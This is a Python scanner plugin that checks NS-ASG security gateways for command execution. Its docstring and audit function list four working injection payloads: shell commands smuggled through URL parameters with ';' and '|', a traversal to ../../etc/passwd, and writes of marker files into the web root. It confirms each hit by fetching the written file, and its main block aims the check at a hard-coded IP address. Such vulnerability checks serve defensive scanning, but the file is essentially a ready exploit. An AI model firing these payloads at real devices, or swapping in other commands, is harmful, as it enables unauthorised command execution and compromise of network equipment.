#!usr/bin/env python
# *-* coding:utf-8 *-*

'''
name: NS-SAG command execution
author: yichin
refer: http://www.wooyun.org/bugs/wooyun-2014-058925
refer: http://www.wooyun.org/bugs/wooyun-2014-058932
refer: http://www.wooyun.org/bugs/wooyun-2014-058944
refer: 0day
description:
    第一处：
    http://foobar/debug/list_logfile.php?action=restartservice&bash=;echo test >/Isc/third-party/httpd/htdocs/test.txt;
    第二处:
    debug/list_logfile.php?logfile%5B%5D=%2FIsc%2FLog%2Fsshd.log;echo test >/Isc/third-party/httpd/htdocs/t.txt;&action=delete
    第三处
    debug/rproxy_diag.php?action=tarfile&search=&logfile[0]=../../etc/passwd|echo testvul2>../test.txt
    第四处
    admin/device_status.php?action=getethinfo&ethx=a| echo testvul3 > /Isc/third-party/httpd/htdocs/test.txt
'''

def assign(service, arg):
    if service == 'ns-asg':
        return True, arg

def audit(arg):
    payloads = [
        arg + 'debug/list_logfile.php?action=restartservice&bash=;echo%20testvul0>/Isc/third-party/httpd/htdocs/test.txt;',
        arg + 'debug/list_logfile.php?logfile%5B%5D=%2FIsc%2FLog%2Fsshd.log;echo%20testvul1>/Isc/third-party/httpd/htdocs/test.txt;&action=delete',
        arg + 'debug/rproxy_diag.php?action=tarfile&search=&logfile[0]=../../etc/passwd|echo%20testvul2>../test.txt',
        arg + 'admin/device_status.php?action=getethinfo&ethx=a|%20echo%20testvul3%20>%20/Isc/third-party/httpd/htdocs/test.txt'
    ]
    for i in range(len(payloads)):
        payload = payloads[i]
        code, head, res, err, _ = curl.curl2(payload)
        if code != 0:
            verify = arg + 'test.txt'
            code, head, res, err, _ = curl.curl2(verify)
            #print res
            if code == 200 and ('testvul'+str(i)) in res:
                security_hole('command execution: ' + payload)

if __name__ == '__main__':
    from dummy import *
    audit(assign('ns-asg', 'https://121.28.81.124/')[1])